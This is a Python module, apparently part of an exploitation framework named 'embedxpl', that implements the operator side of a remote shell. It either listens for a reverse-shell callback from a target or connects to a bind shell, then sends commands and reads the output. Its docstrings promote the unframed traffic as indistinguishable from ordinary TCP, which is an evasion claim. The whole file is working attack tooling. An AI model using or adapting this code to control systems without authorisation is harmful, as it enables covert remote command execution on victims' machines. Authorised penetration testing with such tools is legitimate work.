"""Raw TCP shell engine - reverse and bind modes.

Provides a minimal TCP shell with no detectable framing or handshake.
Supports both reverse (connect-back) and bind (listen-and-accept)
operation modes using raw socket I/O.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import logging
import select
import socket
import threading
from typing import Optional

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellMode,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_DEFAULT_RECV_SIZE = 4096
_BACKLOG = 1


class RawTCPShell(ShellEngine):
    """Reverse or bind TCP shell with minimal wire footprint.

    In **reverse** mode the engine listens on *remote_port* and waits for
    the target to connect back.  In **bind** mode the engine actively
    connects to the target that is already listening.

    No protocol framing is applied; bytes flow directly between the two
    ends.  This makes the traffic indistinguishable from any other raw
    TCP stream.

    Args:
        remote_host: Target IP / hostname.
        remote_port: TCP port (listen port in reverse mode, target port
                     in bind mode).
        mode: ``ShellMode.REVERSE`` (default) or ``ShellMode.BIND``.
        timeout: Socket timeout in seconds.
        recv_size: Maximum bytes per ``recv`` call.
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int,
        mode: ShellMode = ShellMode.REVERSE,
        timeout: float = 30.0,
        recv_size: int = _DEFAULT_RECV_SIZE,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="raw_tcp",
            timeout=timeout,
        )
        self._mode: ShellMode = mode
        self._recv_size: int = max(512, recv_size)
        self._sock: Optional[socket.socket] = None
        self._server_sock: Optional[socket.socket] = None
        self._peer_addr: Optional[tuple] = None

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Establish the TCP channel.

        Returns:
            True on success.

        Raises:
            ShellConnectionError: On socket-level failures.
        """
        self._set_status(ShellStatus.CONNECTING)
        try:
            if self._mode == ShellMode.REVERSE:
                return self._listen_and_accept()
            return self._connect_to_bind()
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(str(exc)) from exc

    def _listen_and_accept(self) -> bool:
        """Reverse-shell mode: listen and accept one connection."""
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.settimeout(self._timeout)
        try:
            srv.bind(("0.0.0.0", self._remote_port))
            srv.listen(_BACKLOG)
            logger.info(
                "Reverse TCP: waiting for callback on 0.0.0.0:%d (timeout=%ds)",
                self._remote_port,
                int(self._timeout),
            )
            conn, addr = srv.accept()
        except socket.timeout as exc:
            srv.close()
            self._set_status(ShellStatus.ERROR, "accept timed out")
            raise ShellConnectionError("Accept timed out") from exc
        except OSError:
            srv.close()
            raise

        conn.settimeout(self._timeout)
        self._sock = conn
        self._server_sock = srv
        self._peer_addr = addr
        self._set_status(ShellStatus.CONNECTED)
        logger.info("Reverse TCP: connection from %s:%d", addr[0], addr[1])
        return True

    def _connect_to_bind(self) -> bool:
        """Bind-shell mode: connect to a listening target."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self._timeout)
        logger.info(
            "Bind TCP: connecting to %s:%d",
            self._remote_host,
            self._remote_port,
        )
        sock.connect((self._remote_host, self._remote_port))
        self._sock = sock
        self._peer_addr = (self._remote_host, self._remote_port)
        self._set_status(ShellStatus.CONNECTED)
        logger.info("Bind TCP: connected to %s:%d", self._remote_host, self._remote_port)
        return True

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Send a command over the TCP socket.

        A newline is appended if *cmd* does not already end with one.

        Args:
            cmd: Command string.

        Returns:
            Number of bytes sent.

        Raises:
            ShellIOError: If the socket is unavailable.
        """
        self._require_connected()
        payload = cmd if cmd.endswith("\n") else cmd + "\n"
        data = payload.encode("utf-8", errors="replace")
        try:
            self._sock.sendall(data)  # type: ignore[union-attr]
            return len(data)
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellIOError(str(exc)) from exc

    def recv(self, timeout: Optional[float] = None) -> str:
        """Receive data from the TCP socket.

        Blocks up to *timeout* seconds waiting for data.

        Args:
            timeout: Override default timeout. None uses the engine default.

        Returns:
            Decoded output string (empty on timeout with no data).

        Raises:
            ShellIOError: If the connection is broken.
        """
        self._require_connected()
        wait = timeout if timeout is not None else self._timeout
        sock = self._sock
        try:
            ready, _, _ = select.select([sock], [], [], wait)
            if not ready:
                return ""
            data = sock.recv(self._recv_size)  # type: ignore[union-attr]
            if not data:
                self._set_status(ShellStatus.DISCONNECTED)
                return ""
            return data.decode("utf-8", errors="replace")
        except socket.timeout:
            return ""
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellIOError(str(exc)) from exc

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Close the TCP connection and release sockets."""
        for s in (self._sock, self._server_sock):
            if s is not None:
                try:
                    s.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    s.close()
                except OSError:
                    pass
        self._sock = None
        self._server_sock = None
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("RawTCPShell closed")

    def is_alive(self) -> bool:
        """Return True if the socket is connected and readable.

        Performs a zero-timeout select probe; a closed peer returns
        readable with zero bytes.
        """
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            return False
        try:
            ready, _, _ = select.select([self._sock], [], [], 0)
            if ready:
                peek = self._sock.recv(1, socket.MSG_PEEK)
                return len(peek) > 0
            return True
        except OSError:
            return False

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _require_connected(self) -> None:
        """Raise ShellIOError if not in CONNECTED state."""
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            raise ShellIOError(
                "Shell not connected (status={})".format(self._status.value)
            )
